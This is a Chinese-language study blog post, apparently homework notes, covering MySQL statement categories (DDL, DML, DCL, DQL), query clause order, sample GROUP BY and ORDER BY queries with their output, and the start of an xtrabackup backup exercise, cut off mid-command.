    <url>/2023/07/28/%E7%AC%AC%E5%85%AD%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="1-简述DDL-DML-DCL-DQL，并且说明mysql各个关键字查询时候的先后顺序"><a href="#1-简述DDL-DML-DCL-DQL，并且说明mysql各个关键字查询时候的先后顺序" class="headerlink" title="1.简述DDL,DML,DCL,DQL，并且说明mysql各个关键字查询时候的先后顺序"></a>1.简述DDL,DML,DCL,DQL，并且说明mysql各个关键字查询时候的先后顺序</h1><h2 id="DDL：数据定义语句"><a href="#DDL：数据定义语句" class="headerlink" title="DDL：数据定义语句"></a>DDL：数据定义语句</h2><p>常用于创建库、表、索引等内容</p><figure class="highlight sql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--创建操作</span><br><span class="hljs-keyword">create</span> database hellodb;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> student;<br><span class="hljs-keyword">create</span> index tid_index <span class="hljs-keyword">on</span> hellodb.stu;<br><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">view</span> view_stu <span class="hljs-keyword">as</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers; ##创建一个<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> teacher表的视图<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">procedure</span> sp_testlog() ##创建存储过程<br><br><span class="hljs-comment">--删除操作</span><br><span class="hljs-keyword">drop</span> database hellodb;<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> student;<br><span class="hljs-keyword">drop</span> index tid_index;<br><br><span class="hljs-comment">--创建表，提前定义属性，一般来说都是以.sql的脚本来执行</span><br><span class="hljs-comment">--创建一个学生表</span><br>id字段tinyint0<span class="hljs-number">-256</span>数字，非负，非空，主键，自增长auto<span class="hljs-operator">-</span>increment<br>##名字：<span class="hljs-type">char</span>字符<span class="hljs-number">4</span>个，非空<br>##性别：male <span class="hljs-keyword">or</span> female，<span class="hljs-number">6</span>个字符<br>##年龄：<span class="hljs-number">0</span><span class="hljs-number">-256</span>，非空<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> student (<br>id tinyint unsigned <span class="hljs-keyword">primary</span> key auto_increment,<br>name <span class="hljs-type">char</span>(<span class="hljs-number">4</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,<br>sex <span class="hljs-type">char</span>(<span class="hljs-number">6</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,<br>age tinyint unsigned<br>);<br></code></pre></td></tr></table></figure><h2 id="DML：数据修改语句"><a href="#DML：数据修改语句" class="headerlink" title="DML：数据修改语句"></a>DML：数据修改语句</h2><p>常用于对表的修改操作，一般来说都要匹配好表的字段以及字段的属性，delete from，update等语句可以加上where条件判断</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> table_name() <span class="hljs-keyword">values</span>(); ##插入表，新增数据<br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>; ##删除表内的数据<br><span class="hljs-keyword">update</span> table_name <span class="hljs-keyword">set</span> age<span class="hljs-operator">=</span><span class="hljs-number">22</span> <span class="hljs-keyword">where</span> tid<span class="hljs-operator">=</span><span class="hljs-number">1</span>; ##修改表内数据<br><br><span class="hljs-comment">--查看teachers表的结构</span><br><span class="hljs-keyword">desc</span> teachers;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> teachers;<br><br><span class="hljs-comment">--操作teachers表，name对应</span><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;catyer&#x27;</span>,<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;F&#x27;</span>);<br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> tid<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br><span class="hljs-keyword">update</span> teachers <span class="hljs-keyword">set</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;mary&#x27;</span> <span class="hljs-keyword">where</span> tid<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><h2 id="DCL：数据控制语句"><a href="#DCL：数据控制语句" class="headerlink" title="DCL：数据控制语句"></a>DCL：数据控制语句</h2><p>可以看到某个用户的权限情况，并且授权给某个用户使用</p><p>可以指定给某个用户授权某个库的权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--给同步复制用户授权对所有库授权all的权限，刷新权限</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> sync@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123&#x27;</span>; <br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> sync@<span class="hljs-string">&#x27;%&#x27;</span>; <br>flush privileges;<br><br><span class="hljs-keyword">show</span> grants <span class="hljs-keyword">for</span> sync@<span class="hljs-string">&#x27;%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------+</span><br><span class="hljs-operator">|</span> Grants <span class="hljs-keyword">for</span> sync@<span class="hljs-operator">%</span>                            <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">GRANT</span> REPLICATION SLAVE <span class="hljs-keyword">ON</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> `sync`@`<span class="hljs-operator">%</span>` <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------+</span><br><br>##回收权限<span class="hljs-keyword">revoke</span>，回收所有权限，回收插入、删除、更新等权限<br><span class="hljs-keyword">revoke</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> sync@<span class="hljs-string">&#x27;%&#x27;</span>;<br><span class="hljs-keyword">revoke</span> <span class="hljs-keyword">insert</span>,<span class="hljs-keyword">delete</span>,<span class="hljs-keyword">update</span> <span class="hljs-keyword">on</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> sync@<span class="hljs-string">&#x27;%&#x27;</span>;<br>flush privileges;<br></code></pre></td></tr></table></figure><h2 id="DQL：数据查询语句"><a href="#DQL：数据查询语句" class="headerlink" title="DQL：数据查询语句"></a>DQL：数据查询语句</h2><p>一般使用的是select语句，单表查询，可以加where表示条件判断，group by表示分组，order by表示以顺序来排序，limit表示显示从第几个记录开始显示几行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs sql">##查询对应的列(域field)<br><span class="hljs-keyword">select</span> Name,Age <span class="hljs-keyword">from</span> students;<br><br>##给输出的字段加别名，可以不这么用<br><span class="hljs-keyword">select</span> name <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br><br>##查询表内一共有多少条记录：<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)，有<span class="hljs-number">25</span>条，只显示有值的，如果为<span class="hljs-keyword">NULL</span>则没有<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> students;<br><br>##查询<span class="hljs-keyword">user</span>表内的<span class="hljs-keyword">user</span>,host<br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host <span class="hljs-keyword">from</span> mysql.user;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">user</span>             <span class="hljs-operator">|</span> host      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+</span><br><span class="hljs-operator">|</span> root             <span class="hljs-operator">|</span> <span class="hljs-operator">%</span>         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> sync             <span class="hljs-operator">|</span> <span class="hljs-operator">%</span>         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> wp               <span class="hljs-operator">|</span> <span class="hljs-operator">%</span>         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> catyer           <span class="hljs-operator">|</span> <span class="hljs-number">10.0</span><span class="hljs-number">.0</span>.<span class="hljs-operator">%</span>  <span class="hljs-operator">|</span><br><br>##查询学生表倒序的年龄顺序，从第三个开始显示，一共显示<span class="hljs-number">5</span>条记录<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> hellodb.stu <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> age <span class="hljs-keyword">desc</span> limit <span class="hljs-number">3</span>,<span class="hljs-number">5</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------+--------------+-----+--------+</span><br><span class="hljs-operator">|</span> StuID <span class="hljs-operator">|</span> Name         <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+--------------+-----+--------+</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">13</span> <span class="hljs-operator">|</span> Tian Boguang <span class="hljs-operator">|</span>  <span class="hljs-number">33</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>     <span class="hljs-number">4</span> <span class="hljs-operator">|</span> Ding Dian    <span class="hljs-operator">|</span>  <span class="hljs-number">32</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">24</span> <span class="hljs-operator">|</span> Xu Xian      <span class="hljs-operator">|</span>  <span class="hljs-number">27</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>     <span class="hljs-number">5</span> <span class="hljs-operator">|</span> Yu Yutong    <span class="hljs-operator">|</span>  <span class="hljs-number">26</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">17</span> <span class="hljs-operator">|</span> Lin Chong    <span class="hljs-operator">|</span>  <span class="hljs-number">25</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+--------------+-----+--------+</span><br></code></pre></td></tr></table></figure><h2 id="MySQL查询语句各关键字的执行顺序"><a href="#MySQL查询语句各关键字的执行顺序" class="headerlink" title="MySQL查询语句各关键字的执行顺序"></a>MySQL查询语句各关键字的执行顺序</h2><p>书写SQL语句的顺序：select—&gt;from—&gt;where—&gt;group by—&gt;having—&gt;order by</p><p>SQL语句的执行顺序：from—&gt;where—&gt;group by—&gt;having—&gt;select—&gt;order by</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--教师表</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name          <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Song Jiang    <span class="hljs-operator">|</span>  <span class="hljs-number">45</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Zhang Sanfeng <span class="hljs-operator">|</span>  <span class="hljs-number">94</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Miejue Shitai <span class="hljs-operator">|</span>  <span class="hljs-number">77</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">4</span> <span class="hljs-operator">|</span> Lin Chaoying  <span class="hljs-operator">|</span>  <span class="hljs-number">93</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">5</span> <span class="hljs-operator">|</span> catyer        <span class="hljs-operator">|</span>  <span class="hljs-number">16</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">7</span> <span class="hljs-operator">|</span> teach         <span class="hljs-operator">|</span>  <span class="hljs-number">20</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">8</span> <span class="hljs-operator">|</span> teach         <span class="hljs-operator">|</span>  <span class="hljs-number">22</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">9</span> <span class="hljs-operator">|</span> teach9        <span class="hljs-operator">|</span>  <span class="hljs-number">20</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">10</span> <span class="hljs-operator">|</span> a             <span class="hljs-operator">|</span>  <span class="hljs-number">22</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">11</span> <span class="hljs-operator">|</span> a             <span class="hljs-operator">|</span>  <span class="hljs-number">22</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">12</span> <span class="hljs-operator">|</span> a             <span class="hljs-operator">|</span>  <span class="hljs-number">22</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><br><span class="hljs-comment">--查询teachers表中男老师和女老师的平均年龄</span><br><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">avg</span>(age) <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br><span class="hljs-operator">|</span> gender <span class="hljs-operator">|</span> <span class="hljs-built_in">avg</span>(age) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br><span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span>  <span class="hljs-number">31.4444</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span>  <span class="hljs-number">85.0000</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br><br><span class="hljs-comment">--查询teachers表中女老师的平均年龄</span><br><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">avg</span>(age) <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> gender<span class="hljs-operator">=</span><span class="hljs-string">&#x27;F&#x27;</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br><span class="hljs-operator">|</span> gender <span class="hljs-operator">|</span> <span class="hljs-built_in">avg</span>(age) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br><span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span>  <span class="hljs-number">85.0000</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br><br><span class="hljs-comment">--查询teachers表中女老师的最小年龄</span><br><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">min</span>(age) <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> gender<span class="hljs-operator">=</span><span class="hljs-string">&#x27;F&#x27;</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender;<br><br><span class="hljs-comment">--</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> age <span class="hljs-keyword">desc</span>;<br></code></pre></td></tr></table></figure><h1 id="2-自行设计10个sql查询语句，需要用到关键字-GROUP-BY-HAVING-ORDER-BY-LIMIT-，至少同时用到两个。"><a href="#2-自行设计10个sql查询语句，需要用到关键字-GROUP-BY-HAVING-ORDER-BY-LIMIT-，至少同时用到两个。" class="headerlink" title="2.自行设计10个sql查询语句，需要用到关键字[GROUP BY/HAVING/ORDER BY/LIMIT]，至少同时用到两个。"></a>2.自行设计10个sql查询语句，需要用到关键字[GROUP BY/HAVING/ORDER BY/LIMIT]，至少同时用到两个。</h1><p>以teacher表，stu学生表作为例子</p><p>group by+having编写规范：前面的select字段必须是group by的条件字段，或者是聚合函数(count，max，min，avg，sum)；一旦group by，select语句必须跟分组字段+聚合函数</p><p>前面select name,gender，后面的group by必须是name,gender其中的一个</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">----查询teachers表中女老师的平均年龄</span><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">avg</span>(age) <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> gender<span class="hljs-operator">=</span><span class="hljs-string">&#x27;F&#x27;</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br><span class="hljs-operator">|</span> gender <span class="hljs-operator">|</span> <span class="hljs-built_in">avg</span>(age) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br><span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span>  <span class="hljs-number">41.1667</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br><br><span class="hljs-comment">----查询teachers表中男老师的最大年龄</span><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">max</span>(age) <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender <span class="hljs-keyword">having</span> gender<span class="hljs-operator">=</span><span class="hljs-string">&#x27;M&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br><span class="hljs-operator">|</span> gender <span class="hljs-operator">|</span> <span class="hljs-built_in">max</span>(age) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br><span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span>      <span class="hljs-number">132</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br><br><br><span class="hljs-comment">--查询女老师中年龄最大的两位</span><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> name,gender,age <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> gender<span class="hljs-operator">=</span><span class="hljs-string">&#x27;F&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> age <span class="hljs-keyword">desc</span> limit <span class="hljs-number">2</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+--------+-----+</span><br><span class="hljs-operator">|</span> name          <span class="hljs-operator">|</span> gender <span class="hljs-operator">|</span> age <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+--------+-----+</span><br><span class="hljs-operator">|</span> Lin Chaoying  <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span>  <span class="hljs-number">93</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Miejue Shitai <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span>  <span class="hljs-number">77</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+--------+-----+</span><br><br><br><span class="hljs-comment">--查询男老师中年龄最小的3位</span><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> name,gender,age <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> gender<span class="hljs-operator">=</span><span class="hljs-string">&#x27;M&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> age limit <span class="hljs-number">3</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------+--------+-----+</span><br><span class="hljs-operator">|</span> name   <span class="hljs-operator">|</span> gender <span class="hljs-operator">|</span> age <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------+--------+-----+</span><br><span class="hljs-operator">|</span> catyer <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span>  <span class="hljs-number">16</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> teach9 <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span>  <span class="hljs-number">20</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> teach  <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span>  <span class="hljs-number">32</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------+--------+-----+</span><br><br><span class="hljs-comment">--统计年龄大于30岁小于70岁的女教师</span><br><span class="hljs-keyword">select</span> name,gender,age <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> age <span class="hljs-keyword">between</span> <span class="hljs-number">30</span> <span class="hljs-keyword">and</span> <span class="hljs-number">70</span>;<br><br><br><span class="hljs-comment">--统计男女老师的人数，按照性别来分组</span><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br><span class="hljs-operator">|</span> gender <span class="hljs-operator">|</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br><span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span>        <span class="hljs-number">8</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span>        <span class="hljs-number">6</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------+----------+</span><br></code></pre></td></tr></table></figure><h1 id="3-xtrabackup备份和还原数据库练习"><a href="#3-xtrabackup备份和还原数据库练习" class="headerlink" title="3.xtrabackup备份和还原数据库练习"></a>3.xtrabackup备份和还原数据库练习</h1><p>xtrabackup备份工具</p><p>专业级别的MySQL备份工具，由percona公司打造的，默认MySQL上没有这个工具，专业级别的备份工具</p><p>一般使用8.0版本—-&gt;对应8.0 MySQL库—&gt;只有一个执行脚本</p><p>2.4版本—&gt;对应老版本MySQL</p><p><a href="https://www.percona.com/software/mysql-database/percona-xtrabackup">https://www.percona.com/software/mysql-database/percona-xtrabackup</a></p><p>xtrabackup执行过程：备份redo_log，事务日志</p><p><img src="2792175-20221007225922867-494673150.png" alt="img"></p><p><img src="2792175-20221007225923268-861479153.png" alt="img"></p><p>下载xtrabackup版本，下载xtrabackup 8.0的版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">https://www.percona.com/downloads/Percona-XtraBackup-LATEST<br>wget https://downloads.percona.com/downloads/Percona-XtraBackup-8.0/Percona-XtraBackup-8.0.29-22/binary/redhat/8/x86_64/percona-xtrabackup-80-8.0.29-22.1.el8.x86_64.rpm<br><br>yum -y install percona-xtrabackup-80-8.0.29-22.1.el8.x86_64.rpm<br>xtrabackup --help<br></code></pre></td></tr></table></figure><p>xtrabackup的常用功能：能够实现全量备份、增量备份等</p><p>xtrabackup备份事务：因为事务具有原子性，必须是完整的，要么就是未执行，要么就是已经commit提交，可以实现回滚不完整的事务</p><h2 id="xtrabackup常用选项"><a href="#xtrabackup常用选项" class="headerlink" title="xtrabackup常用选项"></a>xtrabackup常用选项</h2><p>xtrabackup：是直接备份整个/data/mysql的目录，需要覆盖原来的目录/data/mysql才能实现恢复；MySQL服务需要停服才行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--backup：备份</span><br><span class="hljs-comment">--perpare：还原，回滚不完整的事务</span><br><br>mkdir <span class="hljs-operator">-</span>p <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>xtrabackup<br>xtrabackup <span class="hljs-operator">-</span>uroot <span class="hljs-operator">-</span>p123 <span class="hljs-comment">--backup --target-dir=/data/xtrabackup</span><br>xtrabackup <span class="hljs-operator">-</span>uroot <span class="hljs-operator">-</span>p123 <span class="hljs-comment">--perpare 